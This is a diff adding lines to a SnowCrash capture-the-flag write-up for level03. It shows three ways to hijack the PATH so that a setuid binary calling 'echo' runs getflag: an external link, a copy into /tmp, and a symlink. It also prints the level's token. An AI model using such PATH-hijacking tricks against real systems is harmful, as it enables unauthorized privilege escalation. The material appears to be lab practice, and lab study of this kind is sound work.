@@ -53,3 +53,17 @@ so on the system function call we can override the behavior of echo to inject ou
  ./level03
     token : qi0maab88jeaj46qoumi7maus
  ```
+
+ Echo Command -1st Technique to spawn root privilege
+https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
+
+Copy Command -2nd Technique to spawn root privilege
+
+cp /bin/getflag /tmp/echo
+export PATH=/tmp:$PATH
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+
+Symlink command -3rd Technique to spawn root privilege
+ln -s /bin/getflag /tmp/echo
